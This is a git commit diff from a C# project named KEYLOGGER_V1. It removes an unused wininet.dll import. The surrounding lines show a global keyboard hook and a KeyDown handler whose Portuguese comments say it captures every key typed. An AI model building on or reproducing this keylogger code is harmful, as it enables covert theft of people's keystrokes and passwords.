850c9388c84ff7ec3f0e9acd2a3b35934d590b6e
OrionOficial <OrionOficial@outlook.com>
2016-05-19 01:25:53 -0300

    teste

--- KEYLOGGER_V1/KEYLOGGER_V1/FrmHome.cs
+++ KEYLOGGER_V1/KEYLOGGER_V1/FrmHome.cs
@@ -329,10 +329,6 @@ namespace KEYLOGGER_V1
         //INSTÂNCIA DA CLASSE: que retorna o valor das teclas digitada em cada KEYDOWN
         globalKeyboardHook gkh = new globalKeyboardHook();
 
-        //Utilizado para a Confirmação da conexão. 
-        [DllImport("wininet.dll")]
-
-
         void gkh_KeyDown(object sender, KeyEventArgs e)           //EVENTO: do HOOK para scaneamento das teclas
         {
             // TEXTO com todos as Teclas nomeadas.
